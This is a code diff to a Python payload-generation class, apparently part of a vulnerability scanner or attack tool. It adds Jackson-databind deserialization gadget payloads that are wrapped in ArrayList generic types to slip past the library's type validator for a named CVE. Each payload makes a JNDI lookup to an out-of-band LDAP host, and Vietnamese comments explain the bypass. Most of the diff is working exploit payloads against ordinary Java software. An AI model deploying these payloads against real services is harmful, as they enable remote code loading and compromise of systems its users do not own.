@@ -144,6 +144,8 @@ class PayloadMutation:
             "encoding":          "base64",
             "encoding_chain":    self.vector.get("encoding_chain") or [],
             "request_context":   self.vector.get("request_context"),
+            "transform_chain":   self.vector.get("transform_chain"),
+            "slot_value":        self.vector.get("slot_value"),
         }
 
     def _mutate_java(self) -> Mutations:
@@ -243,6 +245,29 @@ class PayloadMutation:
          '{{"jndiName":"ldap://{domain}/a","loginTimeout":"0"}}]'),
     ]
 
+    # CVE-2026-54512/54513 (GHSA-j3rv-43j4-c7qm, jackson-databind < 2.18.8/2.21.4/
+    # 3.1.4): cung 3 gadget body nhu tren, nhung boc lam generic type parameter cua
+    # 1 container JDK duoc allow-list theo TEN (vd "java.util.ArrayList") - bypass
+    # PolymorphicTypeValidator chi kiem tra ten container truoc dau "<", bo qua
+    # generic argument ben trong. Than gadget (field/property) GIU NGUYEN, chi doi
+    # type ID ben ngoai va boc than gadget vao 1 mang 1 phan tu (vi ArrayList<T>
+    # deserialize tung phan tu list truc tiep thanh T). Verify cau truc tu chinh
+    # test that cua patch (BasicPTVGenericParameterBypassTest.java, jackson-databind
+    # commit 434d6c511): "java.util.ArrayList<pkg.Class>",[{...}]] .
+    JACKSON_OOB_GADGETS_GENERIC_BYPASS = [
+        ("java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>",
+         '["java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>",'
+         '[{{"dataSourceName":"ldap://{domain}/a","autoCommit":true}}]]'),
+        ("java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>",
+         '["java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>",'
+         '[{{"targetBeanName":"ldap://{domain}/a","propertyPath":"foo",'
+         '"beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",'
+         '{{"shareableResources":["ldap://{domain}/a"]}}]}}]]'),
+        ("java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>",
+         '["java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>",'
+         '[{{"jndiName":"ldap://{domain}/a","loginTimeout":"0"}}]]'),
+    ]
+
     def _mutate_jackson_oob(self) -> Mutations:
         oob_domain = get_oob_domain()
         if not oob_domain:
@@ -252,7 +277,8 @@ class PayloadMutation:
             }]
 
         results: Mutations = []
-        for gadget_class, template in self.JACKSON_OOB_GADGETS:
+        all_gadgets = self.JACKSON_OOB_GADGETS + self.JACKSON_OOB_GADGETS_GENERIC_BYPASS
+        for gadget_class, template in all_gadgets:
             raw = template.format(domain=oob_domain)
             b64 = base64.b64encode(raw.encode()).decode()
             payload = self._make_payload("jackson_oob", gadget_class, None, b64)
